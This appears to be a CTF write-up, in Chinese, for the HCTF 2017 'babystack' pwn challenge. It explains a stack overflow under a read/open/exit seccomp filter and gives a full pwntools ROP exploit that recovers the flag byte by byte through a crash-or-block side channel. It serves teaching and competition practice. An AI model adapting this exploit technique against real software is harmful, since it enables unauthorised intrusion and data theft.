{"title":"hctf2017 babystack","slug":"20171114_babystack","date":"2017-11-14T14:05:34.000Z","updated":"2017-11-15T01:44:03.364Z","comments":true,"excerpt":"","content":"<h2 id=\"check\"><a href=\"#check\" class=\"headerlink\" title=\"check\"></a>check</h2><p>程序的逻辑很简单，明显的栈溢出，然后加一个<code>seccomp</code>。</p>\n<p>能用的函数只有</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read</span><br><span class=\"line\">open</span><br><span class=\"line\"><span class=\"built_in\">exit</span></span><br></pre></td></tr></table></figure>\n<p>然后保护就一个NX</p>\n<h2 id=\"think\"><a href=\"#think\" class=\"headerlink\" title=\"think\"></a>think</h2><p>首先当然是leak出libc的地址。</p>\n<h3 id=\"弯路\"><a href=\"#弯路\" class=\"headerlink\" title=\"弯路\"></a>弯路</h3><p>其实也想过用<code>seccomp_reset()</code>，来进行绕过。</p>\n<p>但是观察了栈分配，要造成溢出必然要把<code>seccomp</code>的<code>ctx</code>值给覆盖了，所以无法获取<code>ctx</code>，这个方法不可行</p>\n<h3 id=\"right\"><a href=\"#right\" class=\"headerlink\" title=\"right\"></a>right</h3><p>既然程序只给这几个函数，必然是有原因的。</p>\n<p>很容易写<code>rop</code>把<code>flag</code>文件打开，然后<code>read</code>到<code>bss</code>段。</p>\n<p>但是！！！没有输出。这就很尴尬了。。。</p>\n<p>后来想了想，可以用爆破的方法，在libc找个指令，<code>cmp</code>什么的。</p>\n<p>在一番搜索之后，发现下面的rop</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00000000000D72CE                 cmp     cl, [rsi]</span><br><span class=\"line\">.text:00000000000D72D0                 jz      short loc_D7266</span><br><span class=\"line\">.text:00000000000D72D2                 pop     rbx</span><br><span class=\"line\">.text:00000000000D72D3                 retn</span><br></pre></td></tr></table></figure>\n<p>这就很有趣了，只要把<code>cl</code>弄成猜的值，<code>rsi</code>指向bss读取的flag，一旦相等，程序就会jz，然后直接挂了。如果猜的不对，我们可以利用read的阻塞。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read(0, bss+0x10, 0x1000)</span><br></pre></td></tr></table></figure>\n<p>这样程序就会阻塞，只要写个</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try:</span><br><span class=\"line\">    io.send(&apos;a&apos;*0x100)</span><br><span class=\"line\">except:</span><br><span class=\"line\">    log.success(str(offset)+&quot;, is &quot;+chr(bval))</span><br><span class=\"line\">    return True</span><br></pre></td></tr></table></figure>\n<p>之后依次爆破即可</p>\n<h2 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h2><p>最后附上<code>exp</code>，因为是本地，所以flag就直接放在当前目录测试了，远程的话猜下<code>flag</code>位置就行了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># d3adf1sh</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf_name = <span class=\"string\">\"./babystack\"</span></span><br><span class=\"line\">elf = ELF(elf_name)</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = \"debug\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">LD_LOCAL = <span class=\"keyword\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 爆破</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pwnbrup</span><span class=\"params\">(bval, offset)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> LD_LOCAL:</span><br><span class=\"line\">        io = process(elf_name)</span><br><span class=\"line\">        libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc-2.23.so\"</span>)</span><br><span class=\"line\">        pprdx = <span class=\"number\">0x0000000000001b92</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        libc = ELF(<span class=\"string\">\"./libc.so.6_885acc6870b8ba98983e88e578179a2c\"</span>)</span><br><span class=\"line\">        menv = &#123;<span class=\"string\">'LD_PRELOAD'</span>: <span class=\"string\">\"./libc.so.6_885acc6870b8ba98983e88e578179a2c\"</span>&#125;</span><br><span class=\"line\">        cmp_cxrsi = <span class=\"number\">0xD72CE</span></span><br><span class=\"line\">        pprdx = <span class=\"number\">0x0000000000001b92</span></span><br><span class=\"line\">        pprcxrbx = <span class=\"number\">0xEA66A</span></span><br><span class=\"line\">        io = process(elf_name, env=menv)</span><br><span class=\"line\"></span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">\"give you a chance\\n\"</span>)</span><br><span class=\"line\">    io.sendline(str(elf.got[<span class=\"string\">\"setbuf\"</span>]))</span><br><span class=\"line\">    data = io.recvline()[:<span class=\"number\">-1</span>]</span><br><span class=\"line\">    libc.address = int(data) - libc.symbols[<span class=\"string\">\"setbuf\"</span>]</span><br><span class=\"line\">    <span class=\"comment\">#log.success(\"libc address: \" + hex(libc.address))</span></span><br><span class=\"line\"></span><br><span class=\"line\">    poprdi = <span class=\"number\">0x0000000000400c03</span></span><br><span class=\"line\">    poprsir15 = <span class=\"number\">0x0000000000400c01</span></span><br><span class=\"line\">    bss_addr = <span class=\"number\">0x601090</span></span><br><span class=\"line\">    padding = <span class=\"string\">'a'</span>*<span class=\"number\">0x28</span></span><br><span class=\"line\">    payload = padding</span><br><span class=\"line\">    <span class=\"comment\"># read(0, bss, 8)</span></span><br><span class=\"line\">    payload += p64(poprdi) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    payload += p64(poprsir15) + p64(bss_addr) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    payload += p64(libc.address+pprdx) + p64(<span class=\"number\">7</span>) <span class=\"comment\"># pop rdx ; ret</span></span><br><span class=\"line\">    payload += p64(elf.plt[<span class=\"string\">\"read\"</span>])</span><br><span class=\"line\">    <span class=\"comment\"># open (bss, 2)</span></span><br><span class=\"line\">    payload += p64(poprdi) + p64(bss_addr)</span><br><span class=\"line\">    payload += p64(poprsir15) + p64(<span class=\"number\">2</span>) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    payload += p64(libc.symbols[<span class=\"string\">\"open\"</span>])</span><br><span class=\"line\">    <span class=\"comment\"># read(3, bss_addr, 8)</span></span><br><span class=\"line\">    payload += p64(poprdi) + p64(<span class=\"number\">3</span>)</span><br><span class=\"line\">    payload += p64(poprsir15) + p64(bss_addr) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    payload += p64(libc.address+pprdx) + p64(<span class=\"number\">8</span>) <span class=\"comment\"># pop rdx ; ret</span></span><br><span class=\"line\">    payload += p64(elf.plt[<span class=\"string\">\"read\"</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># rsi = bss+i</span></span><br><span class=\"line\">    payload += p64(poprsir15) + p64(bss_addr+offset) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    payload += p64(pprcxrbx+libc.address) + p64(bval) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"comment\"># cmp cx, [rsi]</span></span><br><span class=\"line\">    payload += p64(cmp_cxrsi+libc.address) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"comment\"># read....</span></span><br><span class=\"line\">    payload += p64(poprdi) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    payload += p64(poprsir15) + p64(bss_addr) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    payload += p64(libc.address+pprdx) + p64(<span class=\"number\">0x1000</span>) <span class=\"comment\"># pop rdx ; ret</span></span><br><span class=\"line\">    payload += p64(elf.plt[<span class=\"string\">\"read\"</span>])</span><br><span class=\"line\">    <span class=\"comment\"># read....</span></span><br><span class=\"line\">    payload += p64(poprdi) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    payload += p64(poprsir15) + p64(bss_addr) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    payload += p64(libc.address+pprdx) + p64(<span class=\"number\">0x1000</span>) <span class=\"comment\"># pop rdx ; ret</span></span><br><span class=\"line\">    payload += p64(elf.plt[<span class=\"string\">\"read\"</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    payload.ljust(<span class=\"number\">0x1000</span>, chr(<span class=\"number\">0</span>))</span><br><span class=\"line\">    io.send(payload)</span><br><span class=\"line\">    sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    io.send(<span class=\"string\">\"./flag\\x00\"</span>)</span><br><span class=\"line\">    sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        io.send(<span class=\"string\">'a'</span>*<span class=\"number\">0x100</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        log.success(str(offset)+<span class=\"string\">\", is \"</span>+chr(bval))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">True</span></span><br><span class=\"line\">    io.close()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> of <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, <span class=\"number\">8</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0x20</span>, <span class=\"number\">0x80</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> pwnbrup(i, of) == <span class=\"keyword\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n","categories":[{"name":"Binary","path":"api/categories/Binary.json"}],"tags":[{"name":"Pwn","path":"api/tags/Pwn.json"}]}